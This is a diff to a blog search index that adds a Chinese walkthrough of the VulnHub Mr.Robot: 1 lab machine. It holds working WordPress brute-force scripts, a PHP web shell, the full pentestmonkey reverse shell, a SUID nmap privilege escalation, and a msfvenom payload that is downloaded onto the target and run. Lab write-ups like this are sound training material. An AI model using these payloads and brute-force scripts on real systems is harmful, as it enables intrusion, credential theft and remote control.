@@ -12560,4 +12560,469 @@ strings unpacked.exe &gt; all.txt
         <tag>CTF</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Mr.Robot: 1 Walkthrough</title>
+    <url>/2026/09/11/Mr.Robot_1_Walkthrough/</url>
+    <content><![CDATA[一、靶机信息
+名称：Mr.Robot: 1
+地址：https://www.vulnhub.com/entry/mr-robot-1,151/
+网络：两台机器均为 NAT
+
+
+靶机导入后先拍快照再开机，玩崩了一键还原；kali 最好也拍快照
+由于用 VMware 跑 Mr.Robot 靶机，老 Ubuntu14.04 内核和新版 VMware 硬件不兼容，一直卡在 Starting up 起不来；换成 VirtualBox，成功启动到登录界面。 
+同时我在 VirtualBox 里装了一个 kali。
+
+
+
+
+二、信息收集2.0 确定 kali 的 IPip a
+
+
+
+kali 的 IP 是 10.0.2.15
+
+2.1 找靶机 IPnmap -sn 10.0.2.0/24
+
+
+
+靶机 IP：10.0.2.3
+
+2.2 端口扫描nmap -sV -sC -T4 -p- 10.0.2.3
+
+
+
+只有 80 和 443 –&gt; Web 应用
+证书 commonName 是 www.example.com 
+
+2.3 访问 http://10.0.2.3
+
+
+2.4 目录爆破dirsearch -u http://10.0.2.3 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html
+
+
+
+
+参数
+作用
+说明
+
+
+
+dir
+目录爆破模式
+对目标进行目录 &#x2F; 文件枚举扫描
+
+
+-u
+目标 URL
+指定要扫描的目标地址
+
+
+-w
+字典文件路径
+指定爆破用的字典文件
+
+
+-x
+额外尝试后缀
+-x php,txt,html → 额外尝试 .php &#x2F; .txt &#x2F; .html 后缀
+
+
+-t
+并发线程
+-t 50 → 用 50 个并发线程，扫描更快
+
+
+
+
+
+
+含有 WordPress 特征文件
+&#x2F;robots.txt
+&#x2F;phpmyadmin
+
+
+&#x2F;readme
+
+
+&#x2F;license
+
+
+&#x2F;intro
+
+
+&#x2F;wp-links-opml
+
+
+
+三、漏洞利用3.1 访问 /robots.txt
+
+fsocity.dic大概率是密码字典或用户名字典
+
+
+fsocity.dic 原始文件内容太多，去重：
+wc -l fsocity.dic          # 先看原始行数sort -u fsocity.dic &gt; fsocity_clean.dicwc -l fsocity_clean.dic    # 再看去重后行数
+
+
+
+key-1-of-3.txt
+
+
+key1：073403c8a58a1f80d943455fb30724b9
+
+3.2 登录 WordPress访问http://10.0.2.3/wp-login
+
+
+有一个登录页面，发现的报错差异批量测。把候选用户名循环喂给登录页，看谁的报错不是 Invalid username。
+
+3.2.1 爆破用户名让 AI 写了一个爆破用户名的 python 脚本：
+import reimport systry:    import requestsexcept ImportError:    print(&quot;没有 requests 库，先安装: pip install requests&quot;)    sys.exit(1)URL = &quot;http://10.0.2.3/wp-login.php&quot;DICT = r&quot;C:\Users\Jasmine\Desktop\fsocity_clean.dic&quot;with open(DICT, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:    users = [line.strip() for line in f if line.strip()]print(f&quot;共 &#123;len(users)&#125; 个候选用户名&quot;)found = []for i, user in enumerate(users, 1):    data = &#123;        &quot;log&quot;: user,        &quot;pwd&quot;: &quot;wrongpass123&quot;,        &quot;wp-submit&quot;: &quot;Log In&quot;,        &quot;redirect_to&quot;: &quot;http://10.0.2.3/wp-admin/&quot;,    &#125;    try:        r = requests.post(URL, data=data, timeout=5)    except requests.RequestException as e:        print(f&quot;[!] 请求失败: &#123;user&#125; (&#123;e.__class__.__name__&#125;)&quot;)        continue    if &quot;Invalid username&quot; not in r.text:        print(f&quot;\n[+] 用户名存在: &#123;user&#125;&quot;)        m = re.search(r&#x27;id=&quot;login_error&quot;[^&gt;]*&gt;(.*?)&lt;/div&gt;&#x27;, r.text, re.S)        if m:            print(&quot;    报错: &quot; + re.sub(r&quot;&lt;[^&gt;]+&gt;&quot;, &quot;&quot;, m.group(1)).strip())        found.append(user)        break    if i % 500 == 0:        print(f&quot;...已测试 &#123;i&#125;/&#123;len(users)&#125;&quot;)if found:    print(f&quot;\n结果: 有效用户名 -&gt; &#123;found&#125;&quot;)else:    print(&quot;\n结果: 字典里没有命中任何用户名&quot;)
+
+
+
+
+3.2.2 爆破密码import reimport systry:    import requestsexcept ImportError:    print(&quot;没有 requests 库，先安装: pip install requests&quot;)    sys.exit(1)URL = &quot;http://10.0.2.3/wp-login.php&quot;DICT = r&quot;C:\Users\Jasmine\Desktop\fsocity_clean.dic&quot;with open(DICT, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:    pwds = [line.strip() for line in f if line.strip()]print(f&quot;共 &#123;len(pwds)&#125; 个候选密码&quot;)found = []for i, pw in enumerate(pwds, 1):    data = &#123;        &quot;log&quot;: &quot;elliot&quot;,        &quot;pwd&quot;: pw,        &quot;wp-submit&quot;: &quot;Log In&quot;,        &quot;redirect_to&quot;: &quot;http://10.0.2.3/wp-admin/&quot;,    &#125;    try:        r = requests.post(URL, data=data, timeout=5, allow_redirects=False)    except requests.RequestException as e:        print(f&quot;[!] 请求失败: &#123;pw&#125; (&#123;e.__class__.__name__&#125;)&quot;)        continue    if r.status_code == 302:        print(f&quot;\n[+] 密码命中: &#123;pw&#125;&quot;)        found.append(pw)        break    if i % 200 == 0:        print(f&quot;...已测试 &#123;i&#125;/&#123;len(pwds)&#125;&quot;)if found:    print(f&quot;\n结果: 有效密码 -&gt; &#123;found&#125;&quot;)else:    print(&quot;\n结果: 字典里没有命中任何密码&quot;)
+
+
+
+账号：elliot
+密码：ER28-0652
+
+
+
+3.3 从后台到 shell3.3.1 评论功能存在 XSS
+
+但是这个貌似没有什么用
+
+3.3.2 发现了主题文件编辑器
+
+
+3.3.3 上传 webshell&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;
+
+
+
+访问：http://10.0.2.3/wp-admin/header.php
+GET 传参：?cmd=id
+
+
+
+3.4 找其他的 keykey1我们在信息收集的时候已经找过，
+key1：073403c8a58a1f80d943455fb30724b9
+?cmd=ls
+
+
+
+key2cmd=ls /cmd=ls /homecmd=ls /home/robot
+
+
+
+
+
+
+
+
+1. 读取 key2cmd=cat /home/robot/key-2-of-3.txt
+
+
+
+没有返回任何东西
+
+2. 查看文件权限cmd=ls -la /home/robot
+
+
+
+
+-r——– 1 robot robot 33  key-2-of-3.txt     ← 只有 robot 自己能读
+-rw-r–r– 1 robot robot 39  password.raw-md5   ← 所有人可读！
+
+
+3. 读 password.raw-md5cmd=cat /home/robot/password.raw-md5
+
+
+
+md5 解码
+echo &quot;c3fcd3d76192e4007dfb496cca67e13b&quot; &gt; hash.txtcat hash.txtjohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+如果遇到没有找到 rockyou.txt 的情况，先看看是否解压
+
+
+
+
+
+3.5 升级成交互式 shell# 在 Kali 里开监听nc -lvnp 4444
+
+
+
+3.5.1 PHP 反向连接 shell 脚本&lt;?php// php-reverse-shell - A Reverse Shell implementation in PHP// Copyright (C) 2007 pentestmonkey@pentestmonkey.net//// This tool may be used for legal purposes only.  Users take full responsibility// for any actions performed using this tool.  The author accepts no liability// for damage caused by this tool.  If these terms are not acceptable to you, then// do not use this tool.//// In all other respects the GPL version 2 applies://// This program is free software; you can redistribute it and/or modify// it under the terms of the GNU General Public License version 2 as// published by the Free Software Foundation.//// This program is distributed in the hope that it will be useful,// but WITHOUT ANY WARRANTY; without even the implied warranty of// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the// GNU General Public License for more details.//// You should have received a copy of the GNU General Public License// along with this program; if not, write to the Free Software// Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA//// This script may be used and modified with or without attribution// (although third party mods must be distributed with the GPL).//// The shell should operate in PHP safe mode when this code is included// (I think...).//// Note that the PHP shell will not work on Windows.  It&#x27;s for Linux/Unix only.//// See http://pentestmonkey.net/tools/web-shells/php-reverse-shell for more info//set_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#x27;10.0.2.15&#x27;;  // Kali监听IP$port = 4444;       // 监听端口，如4444$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;$daemon = 0;$debug = 0;//// Daemonise ourself if possible to avoid zombies later//// pcntl_fork is hardly ever available, but will allow us to daemonise// our php process and avoid zombies.  Worth a try...if (function_exists(&#x27;pcntl_fork&#x27;)) &#123;	// Fork and have the parent process exit	$pid = pcntl_fork();		if ($pid == -1) &#123;		printit(&quot;ERROR: Can&#x27;t fork&quot;);		exit(1);	&#125;		if ($pid) &#123;		exit(0);  // Parent exits	&#125;	// Make the current process a session leader	// Will only succeed if we forked	if (posix_setsid() == -1) &#123;		printit(&quot;Error: Can&#x27;t setsid()&quot;);		exit(1);	&#125;	$daemon = 1;&#125; else &#123;	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);&#125;// Change to a safe directorychdir(&quot;/&quot;);// Remove any umask we inheritedumask(0);//// Open the reverse shell.//$socket = fsockopen($ip, $port, $errno, $errstr, 30);if (!$socket) &#123;	printit(&quot;$errstr ($errno)&quot;);	exit(1);&#125;//// Launch the shell.//$pipes = array();$proc = proc_open($shell, array(	0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin	1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout	2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr), $pipes);if (!is_resource($proc)) &#123;	printit(&quot;ERROR: Can&#x27;t spawn shell&quot;);	exit(1);&#125;// Set everything to non-blocking// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;tstream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($socket, 0);$descriptorspec = array(   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to);while (true) &#123;	// Wait until there is data on a pipe, then read it.	$read = array($pipes[1], $pipes[2], $socket);	$write = array();	$except = array();	$num_changed_streams = stream_select($read, $write, $except, null);	if ($num_changed_streams === false) &#123;		printit(&quot;ERROR: stream_select failed&quot;);		break;	&#125;		if ($num_changed_streams &gt; 0) &#123;				// Got data from the shell&#x27;s stdout or stderr.  Send it down the socket.		foreach ($read as $r) &#123;			if ($r == $pipes[1] || $r == $pipes[2]) &#123;				$data = fread($r, $chunk_size);				if ($data === false || strlen($data) == 0) &#123;					// shell has died					printit(&quot;ERROR: Shell process terminated.&quot;);					exit(1);				&#125;				fwrite($socket, $data);			&#125; else if ($r == $socket) &#123;				// Got data from socket. Send it to shell&#x27;s stdin.				$data = fread($socket, $chunk_size);				if ($data === false || strlen($data) == 0) &#123;					// remote end closed connection					printit(&quot;ERROR: Remote host closed the connection.&quot;);					exit(1);				&#125;				fwrite($pipes[0], $data);			&#125;		&#125;	&#125;&#125;fclose($socket);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($proc);// --- Helper function ---function printit($string) &#123;	if ($GLOBALS[&#x27;debug&#x27;]) &#123;		fwrite(STDERR, $string . &quot;\n&quot;);	&#125;&#125;?&gt;
+
+脚本放 404.php，当访问不存在的路径时触发
+
+
+
+
+
+3.5.2 访问： http://10.0.2.3/wp-admin/abc.php回到 nc， 发现shell 应该已经躺在那了
+
+
+
+3.5.3 TTY 交互式升级
+
+报错含义：拿到的反弹shell没有TTY虚拟终端，su、sudo这类命令必须在真实终端环境才能运行。
+1. 原理
+
+
+名词
+解释
+
+
+
+TTY
+Unix的虚拟终端。负责：Ctrl+C信号转发、密码输入回显控制、作业控制。没有TTY，su&#x2F;sudo无法执行。
+
+
+普通反弹shell
+IO走socket网线通道，没有TTY设备；直接敲/bin/bash不会生成TTY，环境不变。
+
+
+python pty
+pty模块在靶机上创建虚拟TTY设备，把bash挂载到这个虚拟终端上，完成shell升级。
+
+
+2. 升级命令Python2（老靶场常用）
+python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+Python3（新系统）
+python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+
+
+
+
+3.6  切换到 robot，读取 key2之前 md5 解密直接用在线网站更方便
+
+
+su robot// 密码是：abcdefghijklmnopqrstuvwxyzcat /home/robot/key-2-of-3.txt
+
+
+
+key2：822c73956184f694993bede3eb39f959
+
+3.7 提权，找 key3home 找完了，找 root
+
+
+
+Q：现在不能 sudo，怎么提权？robot不在sudoers名单就不能sudo。
+既然sudo这条路走不通，就要换Linux提权思路
+
+查找具有SUID权限的可执行文件
+
+find / -perm -u+s -type f 2&gt;/dev/null
+
+
+查看定时任务 cron（计划任务漏洞）
+
+cat /etc/crontabls -l /etc/cron.*
+
+
+查找高权限可写文件、弱权限配置文件
+
+find / -writable -type f 2&gt;/dev/null
+
+
+查看系统版本、内核漏洞（脏牛等）
+
+uname -a
+
+
+查看有没有其他用户密码、数据库密码、密钥：
+
+cat /etc/passwdcat /etc/shadow  # 要看shadow需要root权限，现在大概率读不了
+
+
+3.7.1  Linux 提权信息收集id                      # 查看当前用户UID/GID、所属用户组，判断是否有特权组sudo -l                 # 列出当前用户可执行的sudo权限；查看是否有免密sudo命令uname -a                # 打印内核版本、系统信息，用于查找内核漏洞提权find / -perm -4000 -type f 2&gt;/dev/null   # 全盘查找SUID(4000)文件，2&gt;/dev/null丢弃权限报错crontab -l              # 查看【当前用户】的定时任务，看是否存在可劫持脚本ls -la /home/robot      # 查看robot家目录所有文件，包含隐藏文件，寻找密钥/密码/备份
+
+
+
+ UID&#x3D;1002，**不是 root (0），**普通用户，无额外特权  
+
+
+ robot没有 sudo 权限
+
+
+ 内核版本：Linux 3.13.0-55-generic  
+https://www.exploit-db.com/
+
+
+&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap 带有 SUID 权限  
+
+
+ robot 用户没有个人定时任务
+
+
+key2 我们已经找到了
+
+3.7.2 Nmap SUID 提权原理： SUID 权限，会让程序运行时，继承这个程序文件所有者的身份，而不是当前运行人的身份。
+
+看 nmap 这个文件的权限
+
+ls -l /usr/local/bin/nmap
+
+
+
+ 文件所有者是root，所以任何人运行这个 nmap 程序，进程的 euid 都会变成这个文件的属主 root。  
+
+
+老版本 Nmap ≤4.x   自带 --interactive 交互式模式。
+
+
+
+
+
+!sh
+
+!  后面跟系统命令，用 nmap 当前进程的身份去执行这条系统命令
+!sh &#x3D; 执行 /bin/sh，弹出一个新的 shell 窗口。  
+/usr/local/bin/nmap --interactive  !sh
+
+
+
+cat /root/key-3-of-3.txt
+
+
+
+key3：04787ddef27c3dee1ee161b21670b4e4
+
+Q：shell 补充
+
+
+程序
+全称
+说明
+
+
+
+/bin/sh
+Bourne Shell
+最古老基础 shell，很多系统是软链接到 dash
+
+
+/bin/bash
+Bourne Again Shell
+我们最常用的，Ubuntu&#x2F;Kali 默认 shell
+
+
+/bin/dash
+Debian Almquist Shell
+轻量版 sh，Ubuntu 里 &#x2F;bin&#x2F;sh 实际指向 dash
+
+
+
+四、为什么放弃内核 exp 这条路？
+****注意！！！*由于我不是用 MSF 拿到的初始 shell*（通过 web 漏洞拿到普通 bash），所以现在 MSF 里没有 meterpreter 会话，直接跑 MSF 内核提权模块是跑不了的。  
+
+4.1 使用 MSF1. 使用 searchsploit 查找对应漏洞Linux 3.13.0-55-generic  
+
+作用：在Exploit-DB漏洞库，搜索该内核可用EXP，找出CVE编号，判断能不能用MSF模块
+
+# 搜索：linux内核 3.13 ubuntu 本地提权searchsploit linux kernel 3.13 ubuntu local privilege escalation
+
+
+
+
+2. Kali打开msfconsolemsfconsole -q
+
+3. 搜索MSF内对应的 overlayfs  模块search overlayfs
+
+返回模块：
+
+
+
+5. 加载这个漏洞模块use 7
+
+6. 查看模块需要配置的选项show options
+
+
+
+set SESSION 1set LHOST 10.0.2.15
+
+
+
+
+7. 运行run# 或者 exploit
+
+
+
+
+8. 获取meterpreter会话
+核心思路：拿到普通 shell（已拿到） → 上传 meterpreter 木马 → MSF 监听 → 获取 meterpreter 会话 → 在 MSF 内做本地提权
+
+
+生成meterpreter反弹木马，上传靶机执行
+
+# kali生成linux x64 meterpretermsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=9999 -f elf &gt; shell.elf
+
+
+
+
+
+kali开启监听：
+
+use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 10.0.2.15set LPORT 9999run
+
+
+
+
+
+靶机上传 shell.elf，加执行权限运行，得到meterpreter会话。
+
+在 Kali，shell.elf 所在的文件夹执行：
+python3 -m http.server 8000
+
+作用：把当前文件夹变成 web 服务，靶机可以通过 wget 下载文件
+
+
+然后回到靶机已有的 robot 普通 shell里执行下载：
+cd /tmpwget http://10.0.2.15:8000/shell.elf# 备选上传方式（wget 不行的时候用）curl 下载：curl http://10.0.2.15:8000/shell.elf -o shell.elf
+
+
+
+赋予执行权限，运行木马
+chmod +x shell.elf./shell.elf
+
+
+
+执行后，切回 MSF 监听窗口，收到 meterpreter 会话！
+
+
+收到会话后提示符：meterpreter &gt;。
+
+9. 把之前的再执行一遍# 先后台挂起meterpreterbackground# 切回msf，加载这个expuse exploit/linux/local/overlayfs_priv_escset SESSION 1set LHOST 10.0.2.15run
+
+
+
+这个 exp 打不了 ，但是我们之前用searchsploit 查找了对应漏洞，可以选择自己下载。
+
+
+
+10. 先 kali 编译，再让靶机下载# 把exp从exploitdb复制到当前文件夹searchsploit -m 37292
+
+
+
+# Kali编译gcc 37292.c -o exp
+
+****但是！！！****编译报错了
+
+
+我们用searchsploit 查找的相关漏洞其实绝大多数对这个靶机内核 3.13.0-55 无效， 列表里剩下的 45010 &#x2F; 44298 &#x2F; 43418 等，漏洞触发条件是 4.x 内核，3.13 根本不适用。
+📚 同系列文章 · vulnhub（2 篇）Basic Pentesting 1 WalkthroughMr.Robot: 1 Walkthrough（本文）]]></content>
+      <categories>
+        <category>靶机练习</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>MSF</tag>
+        <tag>靶机</tag>
+        <tag>内核漏洞</tag>
+      </tags>
+  </entry>
 </search>
